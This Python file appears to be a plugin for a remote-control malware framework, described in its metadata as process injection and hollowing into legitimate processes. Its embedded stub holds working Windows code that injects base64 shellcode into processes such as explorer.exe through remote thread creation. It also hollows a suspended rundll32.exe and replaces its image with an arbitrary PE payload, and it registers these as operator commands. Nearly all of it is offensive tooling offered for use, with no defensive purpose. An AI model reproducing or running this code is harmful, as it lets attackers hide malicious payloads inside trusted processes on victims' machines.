PLUGIN = {"name": "process_inject", "desc": "Process injection & hollowing into legitimate processes", "deps": [], "size": 7.0}

STUB_CODE = r"""
import ctypes, os, subprocess, struct

PROCESS_ALL_ACCESS = 0x1F0FFF
MEM_COMMIT = 0x1000
MEM_RESERVE = 0x2000
PAGE_READWRITE = 0x04
PAGE_EXECUTE_READWRITE = 0x40
CREATE_SUSPENDED = 0x00000004

kernel32 = ctypes.windll.kernel32
ntdll = ctypes.windll.ntdll

def _find_pid(name):
    try:
        out = subprocess.check_output(["tasklist", "/FI", f"IMAGENAME eq {name}", "/FO", "CSV"], timeout=10, creationflags=0x08000000).decode(errors="replace")
        for line in out.split("\n"):
            if name.lower() in line.lower() and "," in line:
                parts = [p.strip('" ') for p in line.split(",")]
                if len(parts) >= 2:
                    try: return int(parts[1])
                    except: pass
    except: pass
    return None

def _inject_shellcode(pid, shellcode):
    try:
        if not shellcode: return False, "No shellcode provided"
        proc = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
        if not proc: return False, f"OpenProcess failed ({ctypes.get_last_error()})"

        addr = kernel32.VirtualAllocEx(proc, None, len(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)
        if not addr: kernel32.CloseHandle(proc); return False, "VirtualAllocEx failed"

        written = ctypes.c_size_t()
        ok = kernel32.WriteProcessMemory(proc, addr, shellcode, len(shellcode), ctypes.byref(written))
        if not ok or written.value != len(shellcode):
            kernel32.VirtualFreeEx(proc, addr, 0, 0x8000)
            kernel32.CloseHandle(proc)
            return False, "WriteProcessMemory failed"

        old = ctypes.c_uint32()
        kernel32.VirtualProtectEx(proc, addr, len(shellcode), PAGE_EXECUTE_READWRITE, ctypes.byref(old))

        thread = kernel32.CreateRemoteThread(proc, None, 0, addr, None, 0, None)
        if not thread:
            kernel32.VirtualFreeEx(proc, addr, 0, 0x8000)
            kernel32.CloseHandle(proc)
            return False, "CreateRemoteThread failed"

        kernel32.CloseHandle(thread)
        kernel32.CloseHandle(proc)
        return True, f"Injected into PID {pid}"
    except Exception as e: return False, str(e)

def _process_hollow(target_exe, payload_path):
    try:
        with open(payload_path, "rb") as f:
            payload = f.read()
        if len(payload) < 0x400: return False, "Payload too small"

        dos_hdr = payload[:64]
        if dos_hdr[:2] != b"MZ": return False, "Invalid PE"
        pe_off = struct.unpack("<I", dos_hdr[60:64])[0]
        if pe_off + 4 > len(payload) or payload[pe_off:pe_off+4] != b"PE\x00\x00":
            return False, "Invalid PE signature"

        file_hdr = payload[pe_off+4:pe_off+24]
        opt_hdr = payload[pe_off+24:]
        magic = struct.unpack("<H", opt_hdr[:2])[0]
        is_32 = magic == 0x10b
        is_64 = magic == 0x20b
        if not is_32 and not is_64: return False, "Unrecognized PE magic"

        if is_32:
            image_base = struct.unpack("<I", opt_hdr[28:32])[0]
            entry_point = struct.unpack("<I", opt_hdr[16:20])[0]
            size_of_image = struct.unpack("<I", opt_hdr[56:60])[0]
            size_of_headers = struct.unpack("<I", opt_hdr[60:64])[0]
            opt_hdr_size = 240
        else:
            image_base = struct.unpack("<Q", opt_hdr[24:32])[0]
            entry_point = struct.unpack("<I", opt_hdr[16:20])[0]
            size_of_image = struct.unpack("<I", opt_hdr[56:60])[0]
            size_of_headers = struct.unpack("<I", opt_hdr[60:64])[0]
            opt_hdr_size = 264

        num_sections = struct.unpack("<H", file_hdr[2:4])[0]
        sec_offset = pe_off + 24 + opt_hdr_size

        sections = []
        for i in range(num_sections):
            raw = payload[sec_offset + i*40:sec_offset + (i+1)*40]
            if len(raw) < 40: break
            name = raw[:8].rstrip(b"\x00").decode(errors="replace")
            sections.append({
                "name": name,
                "rva": struct.unpack("<I", raw[12:16])[0],
                "rsize": struct.unpack("<I", raw[16:20])[0],
                "roffset": struct.unpack("<I", raw[20:24])[0],
            })

        reloc_rva, reloc_size = 0, 0
        for s in sections:
            if s["name"] == ".reloc":
                reloc_rva, reloc_size = s["rva"], s["rsize"]
                break

        si = ctypes.c_ulonglong * 12
        pinfo = (ctypes.c_ulonglong * 4)()
        sinfo = si()
        ret = kernel32.CreateProcessW(target_exe, None, None, None, False, CREATE_SUSPENDED, None, None,
                                      ctypes.byref(sinfo), ctypes.byref(pinfo))
        if not ret: return False, "CreateProcess (suspended) failed"

        proc_h = pinfo[0]
        thread_h = pinfo[1]
        pid = pinfo[2]

        if is_32:
            CONTEXT_FULL = 0x10007
            class Ctx32(ctypes.Structure):
                _fields_ = [
                    ("ContextFlags", ctypes.c_ulong),
                    ("Dr0", ctypes.c_ulong), ("Dr1", ctypes.c_ulong), ("Dr2", ctypes.c_ulong),
                    ("Dr3", ctypes.c_ulong), ("Dr6", ctypes.c_ulong), ("Dr7", ctypes.c_ulong),
                    ("FloatSave", ctypes.c_byte * 152),
                    ("SegGs", ctypes.c_ulong), ("SegFs", ctypes.c_ulong), ("SegEs", ctypes.c_ulong),
                    ("SegDs", ctypes.c_ulong),
                    ("Edi", ctypes.c_ulong), ("Esi", ctypes.c_ulong), ("Ebx", ctypes.c_ulong),
                    ("Edx", ctypes.c_ulong), ("Ecx", ctypes.c_ulong), ("Eax", ctypes.c_ulong),
                    ("Ebp", ctypes.c_ulong), ("Eip", ctypes.c_ulong), ("SegCs", ctypes.c_ulong),
                    ("EFlags", ctypes.c_ulong), ("Esp", ctypes.c_ulong), ("SegSs", ctypes.c_ulong),
                    ("ExtendedRegisters", ctypes.c_byte * 512),
                ]
            ctx = Ctx32()
            ctx.ContextFlags = CONTEXT_FULL
            if not kernel32.GetThreadContext(thread_h, ctypes.byref(ctx)):
                kernel32.CloseHandle(thread_h); kernel32.CloseHandle(proc_h)
                return False, "GetThreadContext failed"
            peb_addr = ctx.Ebx
        else:
            class Ctx64(ctypes.Structure):
                _fields_ = [
                    ("P1Home", ctypes.c_ulonglong), ("P2Home", ctypes.c_ulonglong),
                    ("P3Home", ctypes.c_ulonglong), ("P4Home", ctypes.c_ulonglong),
                    ("P5Home", ctypes.c_ulonglong), ("P6Home", ctypes.c_ulonglong),
                    ("ContextFlags", ctypes.c_ulong), ("MxCsr", ctypes.c_ulong),
                    ("SegCs", ctypes.c_ushort), ("SegDs", ctypes.c_ushort),
                    ("SegEs", ctypes.c_ushort), ("SegFs", ctypes.c_ushort),
                    ("SegGs", ctypes.c_ushort), ("SegSs", ctypes.c_ushort),
                    ("EFlags", ctypes.c_ulong),
                    ("Dr0", ctypes.c_ulonglong), ("Dr1", ctypes.c_ulonglong),
                    ("Dr2", ctypes.c_ulonglong), ("Dr3", ctypes.c_ulonglong),
                    ("Dr6", ctypes.c_ulonglong), ("Dr7", ctypes.c_ulonglong),
                    ("Rax", ctypes.c_ulonglong), ("Rcx", ctypes.c_ulonglong),
                    ("Rdx", ctypes.c_ulonglong), ("Rbx", ctypes.c_ulonglong),
                    ("Rsp", ctypes.c_ulonglong), ("Rbp", ctypes.c_ulonglong),
                    ("Rsi", ctypes.c_ulonglong), ("Rdi", ctypes.c_ulonglong),
                    ("R8", ctypes.c_ulonglong), ("R9", ctypes.c_ulonglong),
                    ("R10", ctypes.c_ulonglong), ("R11", ctypes.c_ulonglong),
                    ("R12", ctypes.c_ulonglong), ("R13", ctypes.c_ulonglong),
                    ("R14", ctypes.c_ulonglong), ("R15", ctypes.c_ulonglong),
                    ("Rip", ctypes.c_ulonglong),
                ]
            ctx64 = Ctx64()
            ctx64.ContextFlags = 0x100000
            if not kernel32.GetThreadContext(thread_h, ctypes.byref(ctx64)):
                kernel32.CloseHandle(thread_h); kernel32.CloseHandle(proc_h)
                return False, "GetThreadContext failed"
            peb_addr = ctx64.Rdx  # RDX points to PEB on x64

        # Read image base from PEB (offset 8)
        img_base = ctypes.c_ulonglong() if is_64 else ctypes.c_ulong()
        read = ctypes.c_size_t()
        kernel32.ReadProcessMemory(proc_h, peb_addr + 8, ctypes.byref(img_base), ctypes.sizeof(img_base), ctypes.byref(read))

        ntdll.NtUnmapViewOfSection(proc_h, img_base)

        alloc_addr = kernel32.VirtualAllocEx(proc_h, None if is_64 else img_base, size_of_image, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)
        if not alloc_addr:
            alloc_addr = kernel32.VirtualAllocEx(proc_h, None, size_of_image, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)

        if not alloc_addr:
            kernel32.CloseHandle(thread_h); kernel32.CloseHandle(proc_h)
            return False, "VirtualAllocEx failed"

        kernel32.WriteProcessMemory(proc_h, alloc_addr, payload[:size_of_headers], size_of_headers, ctypes.byref(read))

        for s in sections:
            if s["rsize"] and s["roffset"]:
                sec_data = payload[s["roffset"]:s["roffset"]+s["rsize"]]
                if sec_data:
                    kernel32.WriteProcessMemory(proc_h, alloc_addr + s["rva"], sec_data, len(sec_data), ctypes.byref(read))

        delta = alloc_addr - (img_base.value if is_64 else img_base.value & 0xFFFFFFFF)
        if delta and reloc_rva:
            for s in sections:
                if s["roffset"] and s["rsize"] and (s["rva"] <= reloc_rva < s["rva"] + s["rsize"]):
                    reloc_data = payload[s["roffset"] + (reloc_rva - s["rva"]):s["roffset"] + (reloc_rva - s["rva"]) + reloc_size]
                    pos = 0
                    while pos + 8 <= len(reloc_data):
                        page_rva = struct.unpack("<I", reloc_data[pos:pos+4])[0]
                        block_size = struct.unpack("<I", reloc_data[pos+4:pos+8])[0]
                        if block_size == 0: break
                        entries = (block_size - 8) // 2
                        for e in range(entries):
                            off = pos + 8 + e * 2
                            if off + 2 > len(reloc_data): break
                            entry = struct.unpack("<H", reloc_data[off:off+2])[0]
                            entry_type = entry >> 12
                            entry_off = entry & 0xFFF
                            if entry_type == 3 and is_32:
                                addr = alloc_addr + page_rva + entry_off
                                val = ctypes.c_uint32()
                                kernel32.ReadProcessMemory(proc_h, addr, ctypes.byref(val), 4, ctypes.byref(read))
                                val = ctypes.c_uint32(val.value + (delta & 0xFFFFFFFF))
                                kernel32.WriteProcessMemory(proc_h, addr, ctypes.byref(val), 4, ctypes.byref(read))
                            elif entry_type == 0xA and is_64:
                                addr = alloc_addr + page_rva + entry_off
                                val = ctypes.c_ulonglong()
                                kernel32.ReadProcessMemory(proc_h, addr, ctypes.byref(val), 8, ctypes.byref(read))
                                val = ctypes.c_ulonglong(val.value + delta)
                                kernel32.WriteProcessMemory(proc_h, addr, ctypes.byref(val), 8, ctypes.byref(read))
                        pos += block_size
                    break

        if is_32:
            ctx.Eax = alloc_addr + entry_point
            kernel32.SetThreadContext(thread_h, ctypes.byref(ctx))
        else:
            ctx64.Rcx = alloc_addr + entry_point
            kernel32.SetThreadContext(thread_h, ctypes.byref(ctx64))

        kernel32.ResumeThread(thread_h)
        kernel32.CloseHandle(thread_h)
        kernel32.CloseHandle(proc_h)
        return True, f"Hollowed {os.path.basename(target_exe)} (PID {pid}) -> {os.path.basename(payload_path)}"
    except Exception as e:
        return False, str(e)

def _cmd_inject_shellcode(m):
    try:
        if platform.system() != "Windows": return {"output": "[!] Injection requires Windows"}
        target = m.get("target", "explorer.exe")
        pid = m.get("pid", None)
        if pid is None:
            pid = _find_pid(target)
            if pid is None: return {"output": f"[!] Process '{target}' not found"}
        shellcode_b64 = m.get("shellcode", "")
        if not shellcode_b64: return {"output": "[!] No shellcode provided (base64)"}
        import base64
        shellcode = base64.b64decode(shellcode_b64)
        ok, msg = _inject_shellcode(pid, shellcode)
        return {"output": f"[+] Shellcode injection: {msg}" if ok else f"[!] {msg}"}
    except Exception as e: return {"output": f"[!] Inject error: {e}"}

def _cmd_process_hollow(m):
    try:
        if platform.system() != "Windows": return {"output": "[!] Process hollowing requires Windows"}
        target = m.get("target", "C:\\Windows\\System32\\rundll32.exe")
        payload_path = m.get("payload", "")
        if not payload_path or not os.path.isfile(payload_path):
            return {"output": "[!] Provide valid payload path"}
        ok, msg = _process_hollow(target, payload_path)
        return {"output": f"[+] Process hollowing: {msg}" if ok else f"[!] {msg}"}
    except Exception as e: return {"output": f"[!] Hollow error: {e}"}

def _cmd_list_processes(m):
    try:
        if platform.system() != "Windows": return {"output": "[!] Process listing requires Windows"}
        out = subprocess.check_output(["tasklist", "/FO", "CSV", "/NH"], timeout=10, creationflags=0x08000000).decode(errors="replace")
        lines = []
        for line in out.split("\n"):
            if line.strip():
                parts = [p.strip('" ') for p in line.split(",")]
                if len(parts) >= 2:
                    lines.append(f"  {parts[1]:>6s}  {parts[0][:30]}")
                    if len(lines) >= 50: break
        return {"output": "[+] Processes (PID, Name):\n" + "\n".join(lines)}
    except Exception as e: return {"output": f"[!] Process list error: {e}"}

_CMDS["inject_shellcode"] = _cmd_inject_shellcode
_CMDS["process_hollow"] = _cmd_process_hollow
_CMDS["list_processes"] = _cmd_list_processes
"""

def get_commands():
    return {"inject_shellcode": "_cmd_inject_shellcode", "process_hollow": "_cmd_process_hollow", "list_processes": "_cmd_list_processes"}
